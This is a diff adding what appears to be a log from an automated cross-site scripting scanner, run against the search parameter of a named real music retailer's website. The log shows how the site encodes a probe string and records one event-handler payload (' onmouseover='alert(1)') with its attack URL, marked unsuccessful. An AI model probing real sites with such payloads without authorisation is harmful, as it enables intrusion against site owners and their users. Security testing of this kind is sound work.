@@ -1,0 +1,45 @@
+http://www.theacousticmusicco.co.uk
+
+GET Params:[1]
+['q']
+_______________________________________________________________________________________________________
+http://www.theacousticmusicco.co.uk/catalogsearch/result/?q=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [1]
+<input id="search" type="text" class="input-text" name="q" value="(uvw&quot;xyz'yxz&lt;/zxy" />
+
+----------------------------------------------------------------------------------
+HTML Context: [2]
+<title>Search results for: '(uvw&quot;xyz'yxz&lt;/zxy'</title>
+<h3>Search results for '(uvw&quot;xyz'yxz&lt;/zxy'</h3>
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	False	True	False
+
+Attack Payloads for ATTR
+["' onmouseover='alert(1)"]
+
+ATTR Attack Url: http://www.theacousticmusicco.co.uk/catalogsearch/result/?q=' onmouseover='alert(1)
+
+ ______ UnSuccessful with payload: ' onmouseover='alert(1)
+
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	False	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	False	True	False
+
+Attack Payloads for HTML
+[]
